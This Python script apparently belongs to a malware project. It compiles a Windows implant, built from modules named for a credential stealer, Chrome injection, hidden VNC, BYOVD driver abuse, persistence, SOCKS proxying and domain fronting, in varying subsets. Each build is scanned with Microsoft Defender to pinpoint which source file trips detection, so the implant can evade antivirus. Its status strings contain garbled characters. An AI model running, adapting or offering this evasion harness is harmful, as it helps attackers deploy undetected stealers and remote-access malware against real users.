#!/usr/bin/env python3
"""Strip Test: Build full agent removing files one-by-one to find Defender ML trigger."""
import subprocess, os, sys

BUILD_DIR = 'build'
AGENT_DIR = 'agent/native'
os.makedirs(BUILD_DIR, exist_ok=True)

# Base files (stager-equivalent, known CLEAN)
BASE = ['core.c','syscall.c','stack_spoof.c','cap_loader.c','dead_drop.c',
        'inject.c','domain_front.c','bof_loader.c']

# Suspect files to test (from full build, not in stager)
SUSPECTS = ['main.c','stealer.c','chrome_v20.c','chrome_inject.c',
            'socks5.c','hvnc.c','persist.c','byovd.c','eprocess.c','version_stubs.c']

LIBS = '-lkernel32 -luser32 -lws2_32 -lgdi32 -luuid -ladvapi32 -lcrypt32 -lole32 -loleaut32 -lwinhttp -lbcrypt -liphlpapi -ldbghelp -lshlwapi -lntdll -lversion'

# Find Defender
plat = r'C:\ProgramData\Microsoft\Windows Defender\Platform'
vs = sorted(os.listdir(plat), reverse=True)
MP = os.path.join(plat, vs[0], 'MpCmdRun.exe')

def build_and_scan(name, srcs):
    """Build with given sources, scan with Defender."""
    src_paths = ' '.join(f'{AGENT_DIR}/{s}' for s in srcs)
    out = os.path.join(BUILD_DIR, f'strip_{name}.exe')
    cmd = f'gcc -w -DARES_RELEASE -O2 -s -fno-ident -fno-asynchronous-unwind-tables -Wl,--stack,4194304 -mwindows -I. -o {out} {src_paths} {LIBS}'
    
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd='.')
    if r.returncode != 0:
        return 'BUILD_FAIL', r.stderr[:200]
    
    sz = os.path.getsize(out)
    r2 = subprocess.run([MP, '-Scan', '-ScanType', '3', '-File', os.path.abspath(out), '-DisableRemediation'],
                        capture_output=True, text=True, timeout=30)
    
    if 'found no threats' in r2.stdout:
        return 'CLEAN', f'{sz:,}B'
    else:
        threat = ''
        for line in r2.stdout.split('\n'):
            if 'Threat' in line and ':' in line:
                threat = line.strip()
        return 'DETECTED', f'{sz:,}B | {threat}'

print('='*60)
print('STRIP TEST: Finding Defender ML trigger files')
print('='*60)

# Test 1: Add each suspect file individually to base
print('\n--- Phase 1: Base + 1 suspect file ---')
for suspect in SUSPECTS:
    srcs = BASE + [suspect]
    # main.c needs special handling (it has WinMain)
    if suspect == 'main.c':
        # main.c is the entry point for full build, skip for individual test
        # since it won't link without other modules
        srcs_test = BASE + [suspect]
    result, detail = build_and_scan(suspect.replace('.c',''), srcs)
    status = 'âo. CLEAN' if result == 'CLEAN' else ('â?O DETECTED' if result == 'DETECTED' else 'âs ï,? BUILD_FAIL')
    print(f'  base+{suspect:20s} â+' {status} ({detail})')

# Test 2: Full minus each suspect
print('\n--- Phase 2: Full - 1 suspect file ---')
for suspect in SUSPECTS:
    if suspect == 'main.c':
        continue  # Can't remove entry point
    srcs = BASE + [s for s in SUSPECTS if s != suspect]
    result, detail = build_and_scan(f'no_{suspect.replace(".c","")}', srcs)
    status = 'âo. CLEAN' if result == 'CLEAN' else ('â?O DETECTED' if result == 'DETECTED' else 'âs ï,? BUILD_FAIL')
    print(f'  full-{suspect:20s} â+' {status} ({detail})')

# Test 3: Full minus stealer group
print('\n--- Phase 3: Targeted groups ---')
stealer_group = ['stealer.c','chrome_v20.c','chrome_inject.c']
srcs = BASE + [s for s in SUSPECTS if s not in stealer_group]
result, detail = build_and_scan('no_stealer_group', srcs)
status = 'âo. CLEAN' if result == 'CLEAN' else ('â?O DETECTED' if result == 'DETECTED' else 'âs ï,? BUILD_FAIL')
print(f'  full-stealer_group      â+' {status} ({detail})')

# main.c without steal functions (just beacon)
rat_group = ['socks5.c','hvnc.c','byovd.c','eprocess.c']
srcs = BASE + [s for s in SUSPECTS if s not in stealer_group and s not in rat_group]
result, detail = build_and_scan('minimal_main', srcs)
status = 'âo. CLEAN' if result == 'CLEAN' else ('â?O DETECTED' if result == 'DETECTED' else 'âs ï,? BUILD_FAIL')
print(f'  main+persist+stubs      â+' {status} ({detail})')

print('\n' + '='*60)
print('DONE')

